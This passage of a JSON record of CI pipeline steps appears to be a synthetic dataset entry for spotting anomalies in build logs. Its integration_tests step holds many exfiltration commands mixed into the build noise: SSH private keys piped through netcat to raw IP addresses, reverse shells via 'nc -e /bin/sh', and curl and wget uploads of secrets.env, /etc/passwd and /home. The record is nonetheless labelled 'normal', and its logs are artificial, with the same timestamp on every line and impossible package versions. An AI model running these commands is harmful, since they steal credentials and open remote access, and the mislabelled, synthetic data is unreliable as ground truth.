          "  PASS: test_auth_login (335ms)",
          "\u2713 build completed",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing jest@1.15.0",
          "  PASS: test_user_create (348ms)",
          "[12:00:21] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Cache hit for key-7982",
          "Installing axios@3.6.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 8/10: Building",
          "Cache hit for key-8852",
          "Compiling src/app.ts...",
          "Cache hit for key-6453",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Cache hit for key-6159",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 lint completed",
          "Installing axios@4.19.0",
          "\u2713 lint completed",
          "Cache hit for key-7779",
          "Cache hit for key-6092",
          "  PASS: test_user_create (170ms)",
          "Cache hit for key-6891",
          "  PASS: test_db_connect (287ms)",
          "[12:00:21] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_auth_login (82ms)",
          "Compiling src/index.js...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-19T12:02:23.796493",
        "finished_at": "2025-12-19T12:02:28.906751",
        "log_lines": [
          "=== Step: deploy_production ===",
          "WARNING: eslint has known vulnerabilities",
          "Step 10/10: Building",
          "Cache hit for key-4261",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-9849",
          "\u2713 test completed",
          "Step 6/10: Building",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/index.js...",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-5035",
          "Cache hit for key-2000",
          "Cache hit for key-1663",
          "\u2713 build completed",
          "Installing eslint@1.15.0",
          "Compiling src/handler.rs...",
          "Exception: NullPointerException",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (300ms)",
          "Cache hit for key-2878",
          "Compiling src/index.js...",
          "Installing react@2.13.0",
          "  PASS: test_db_connect (286ms)",
          "  PASS: test_api_health (21ms)",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-3214",
          "Installing axios@3.0.0",
          "  PASS: test_cache_hit (217ms)",
          "Step 1/10: Building",
          "Step 8/10: Building",
          "Installing webpack@1.14.0",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-4606",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_db_connect (3ms)",
          "Cache hit for key-2432",
          "Compiling src/handler.rs...",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing jest@4.14.0",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 1/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-8866",
          "Cache hit for key-7800",
          "\u2713 lint completed",
          "Cache hit for key-8649",
          "Cache hit for key-8404",
          "Compiling src/main.py...",
          "Step 6/10: Building",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-1065",
          "Cache hit for key-3579",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "  PASS: test_auth_login (167ms)",
          "Compiling src/index.js...",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "\u2713 lint completed",
          "Installing eslint@4.9.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "WARNING: webpack has known vulnerabilities",
          "Installing axios@3.3.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-6378",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (356ms)",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Step 3/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-3674",
          "Cache hit for key-6341",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (489ms)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (6MB)",
          "WARNING: lodash has known vulnerabilities",
          "  PASS: test_user_create (11ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing axios@4.5.0",
          "WARNING: axios has known vulnerabilities",
          "Installing prettier@1.16.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_auth_login (145ms)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-19T12:02:28.906751",
        "finished_at": "2025-12-19T12:02:41.682396",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:00:21] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (140ms)",
          "\u2713 test completed",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:21] INFO: Processing request",
          "Installing webpack@3.8.0",
          "  PASS: test_user_create (22ms)",
          "Step 2/10: Building",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (124ms)",
          "Step 5/10: Building",
          "Compiling src/handler.rs...",
          "Installing jest@4.7.0",
          "Cache hit for key-6354",
          "  PASS: test_user_create (461ms)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Installing webpack@5.15.0",
          "\u2717 build failed with exit code 119",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Installing jest@5.18.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Cache hit for key-8309",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Step 4/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 7/10: Building",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing express@3.17.0",
          "Cache hit for key-1372",
          "Step 9/10: Building",
          "  PASS: test_cache_hit (13ms)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "  PASS: test_db_connect (241ms)",
          "  PASS: test_db_connect (434ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-9638",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing eslint@2.18.0",
          "Compiling src/app.ts...",
          "Installing prettier@3.16.0",
          "Cache hit for key-4540",
          "Cache hit for key-2646",
          "Step 1/10: Building",
          "\u2713 test completed",
          "  PASS: test_user_create (286ms)",
          "  PASS: test_auth_login (153ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_auth_login (480ms)",
          "Step 7/10: Building",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_cache_hit (17ms)",
          "Cache hit for key-2693",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing react@4.7.0",
          "Installing react@3.6.0",
          "  PASS: test_db_connect (426ms)",
          "Compiling src/app.ts...",
          "Step 4/10: Building",
          "Installing jest@1.7.0",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_api_health (362ms)",
          "Cache hit for key-4172",
          "  PASS: test_cache_hit (3ms)",
          "Cache hit for key-9388",
          "Cache hit for key-5487",
          "Cache hit for key-3732",
          "[12:00:21] INFO: Processing request",
          "\u2713 test completed",
          "  PASS: test_api_health (43ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:21] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Cache hit for key-6267",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 3/10: Building",
          "  PASS: test_user_create (46ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-9761",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-19T12:02:41.682396",
        "finished_at": "2025-12-19T12:02:54.458041",
        "log_lines": [
          "=== Step: setup_node ===",
          "  PASS: test_db_connect (245ms)",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-1545",
          "Step 1/10: Building",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (338ms)",
          "  PASS: test_db_connect (79ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 6/10: Building",
          "Installing axios@4.1.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_auth_login (476ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:21] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (157ms)",
          "\u2713 lint completed",
          "  PASS: test_api_health (487ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: webpack has known vulnerabilities",
          "Step 10/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-1655",
          "[12:00:21] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Cache hit for key-9003",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing eslint@2.12.0",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (308ms)",
          "\u2713 test completed",
          "\u2717 build failed with exit code 34",
          "Cache hit for key-8571",
          "  PASS: test_auth_login (459ms)",
          "[12:00:21] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Cache hit for key-4100",
          "  PASS: test_cache_hit (290ms)",
          "Installing axios@2.16.0",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Installing prettier@1.13.0",
          "Installing express@1.5.0",
          "Step 3/10: Building",
          "Cache hit for key-9696",
          "Installing lodash@5.8.0",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing jest@4.1.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_cache_hit (157ms)",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Cache hit for key-2212",
          "Step 3/10: Building",
          "Installing react@5.9.0",
          "Step 7/10: Building",
          "Installing prettier@1.20.0",
          "Step 3/10: Building",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (413ms)",
          "Cache hit for key-5998",
          "Installing axios@2.1.0",
          "Step 6/10: Building",
          "Installing axios@3.15.0",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: express has known vulnerabilities",
          "[12:00:21] WARN: Deprecated API usage",
          "Installing express@4.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_api_health (2ms)",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Cache hit for key-5423",
          "Cache hit for key-6845",
          "Cache hit for key-4147",
          "Cache hit for key-6413",
          "[12:00:21] WARN: Deprecated API usage",
          "[12:00:21] INFO: Processing request",
          "Step 4/10: Building",
          "  PASS: test_db_connect (107ms)",
          "\u2713 lint completed",
          "[12:00:21] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-4250",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_user_create (18ms)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Step 9/10: Building",
          "  PASS: test_user_create (369ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing jest@1.13.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-19T12:02:54.458041",
        "finished_at": "2025-12-19T12:03:20.009331",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:00:21] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 test completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 224.47.179.189 58356",
          "Step 10/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-8282",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:21] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:21] INFO: Processing request",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "[12:00:21] WARN: Deprecated API usage",
          "Cache hit for key-7321",
          "  PASS: test_auth_login (427ms)",
          "Compiling src/app.ts...",
          "Installing axios@1.3.0",
          "  PASS: test_api_health (4ms)",
          "Installing webpack@5.2.0",
          "Compiling src/utils.go...",
          "Cache hit for key-6579",
          "Installing jest@3.15.0",
          "Installing webpack@3.9.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 7.12.134.216 18330",
          "WARNING: prettier has known vulnerabilities",
          "Sending 186MB of data to test.io",
          "  PASS: test_db_connect (185ms)",
          "Cache hit for key-2657",
          "[12:00:21] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Cache hit for key-4098",
          "  PASS: test_auth_login (186ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (142ms)",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:21] ERROR: Connection failed",
          "Installing axios@1.6.0",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "\u2713 build completed",
          "Cache hit for key-5909",
          "Compiling src/app.ts...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "  PASS: test_auth_login (11ms)",
          "  PASS: test_user_create (282ms)",
          "Compiling src/app.ts...",
          "Installing react@1.17.0",
          "\u2713 test completed",
          "Installing react@4.7.0",
          "  PASS: test_cache_hit (62ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_api_health (398ms)",
          "Step 4/10: Building",
          "[12:00:21] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 31",
          "Cache hit for key-5526",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-5965",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Sending 243MB of data to cloud.services",
          "Installing express@5.3.0",
          "  PASS: test_user_create (199ms)",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "  PASS: test_api_health (9ms)",
          "Sending 212MB of data to example.com",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache hit for key-8194",
          "Compiling src/index.js...",
          "Sending 365MB of data to cloud.services",
          "Step 2/10: Building",
          "Step 3/10: Building",
          "  PASS: test_api_health (354ms)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "Installing react@5.14.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Cache hit for key-8869",
          "  PASS: test_cache_hit (30ms)",
          "nc -e /bin/sh 201.97.158.70 60602",
          "[12:00:21] INFO: Processing request",
          "Cache hit for key-9917",
          "[12:00:21] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 92.18.216.53 18258",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Installing prettier@3.10.0",
          "  PASS: test_db_connect (499ms)",
          "Installing axios@1.6.0",
          "Compiling src/handler.rs...",
          "Installing axios@2.16.0",
          "Step 5/10: Building",
          "[12:00:21] INFO: Processing request",
          "  PASS: test_api_health (233ms)",
          "[12:00:21] INFO: Processing request",
          "[12:00:21] INFO: Processing request",
          "Installing axios@4.14.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_cache_hit (479ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "Compiling src/index.js...",
          "  PASS: test_api_health (71ms)",
          "\u2713 test completed",
          "Cache hit for key-1905",
          "WARNING: react has known vulnerabilities",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Cache hit for key-4197",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "Artifact uploaded: build.tar.gz (44MB)",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "nc -e /bin/sh 92.140.99.82 21178",
          "Artifact uploaded: build.tar.gz (9MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 180.130.234.161 58131",
          "Compiling src/handler.rs...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 82.28.186.124 23272",
          "Sending 276MB of data to example.com",
          "FAILED: test_auth_login",
          "Compiling src/main.py...",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}